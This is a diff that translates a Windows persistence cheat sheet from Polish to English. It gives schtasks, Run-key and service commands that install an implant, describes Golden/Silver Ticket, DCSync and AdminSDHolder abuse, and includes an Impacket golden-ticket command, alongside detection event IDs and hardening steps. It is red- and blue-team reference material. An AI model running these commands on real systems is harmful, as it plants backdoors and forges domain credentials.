@@ -12,9 +12,9 @@ author: "core"
 # Windows Persistence
 
 ## TL;DR
-Autostart (Run keys), zadania harmonogramu, usługi, WMI event subs, startup folder. AD: Golden/Silver Ticket, DCSync, AdminSDHolder.
+Autostart (Run keys), scheduled tasks, services, WMI event subs, startup folder. AD: Golden/Silver Ticket, DCSync, AdminSDHolder.
 
-## Lokalne
+## Local
 ```powershell
 # Scheduled task
 schtasks /create /tn "Updater" /tr "C:\Windows\Temp\impl.exe" /sc onlogon /ru SYSTEM
@@ -22,33 +22,33 @@ schtasks /create /tn "Updater" /tr "C:\Windows\Temp\impl.exe" /sc onlogon /ru SY
 # Run key
 reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /d "C:\...\impl.exe"
 
-# Usługa
+# Service
 sc create updater binpath= "C:\...\impl.exe" start= auto
 
-# WMI event subscription (fileless, przetrwa reboot)
+# WMI event subscription (fileless, survives reboot)
 # __EventFilter + __EventConsumer + FilterToConsumerBinding
 ```
 
-## Domenowe (po przejęciu)
+## Domain (post-compromise)
 ```text
-Golden Ticket   – TGT podpisany hashem krbtgt (dowolny user, dowolne uprawnienia)
-Silver Ticket   – TGS dla konkretnej usługi (hash konta usługi/hosta)
-DCSync rights   – nadanie replikacji low-priv userowi -> zrzut haseł na żądanie
-AdminSDHolder   – modyfikacja ACL -> odtwarzane co 60 min na chronionych grupach
+Golden Ticket   – TGT signed with the krbtgt hash (any user, any privileges)
+Silver Ticket   – TGS for a specific service (service/host account hash)
+DCSync rights   – grant replication to a low-priv user -> dump hashes on demand
+AdminSDHolder   – modify the ACL -> reapplied every 60 min on protected groups
 ```
 ```bash
 # Golden ticket (Impacket)
 impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
 ```
 
-## Wykrywanie (Blue Team)
-- Event **7045** (usługa), **4698** (task), Run-key zmiany, WMI **5861**.
-- Golden Ticket: TGT z nietypowo długim lifetime / nieistniejący user; brak 4768 przy 4769.
-- **4720** (nowe konto), zmiany ACL AdminSDHolder.
+## Detection (Blue Team)
+- Event **7045** (service), **4698** (task), Run-key changes, WMI **5861**.
+- Golden Ticket: TGT with an unusually long lifetime / non-existent user; no 4768 preceding 4769.
+- **4720** (new account), AdminSDHolder ACL changes.
 
-## Mitygacja / Hardening
-- Regularna rotacja **krbtgt** (2×), monitoring WMI subs, autostart baseline.
-- Ochrona kont Tier 0, alerty na DCSync (4662 z prawami replikacji dla nie-DC).
+## Mitigation / Hardening
+- Regular **krbtgt** rotation (twice), monitor WMI subs, autostart baseline.
+- Protect Tier 0 accounts, alert on DCSync (4662 with replication rights for a non-DC).
 
-## Źródła
+## Sources
 - [MITRE Persistence](https://attack.mitre.org/tactics/TA0003/)
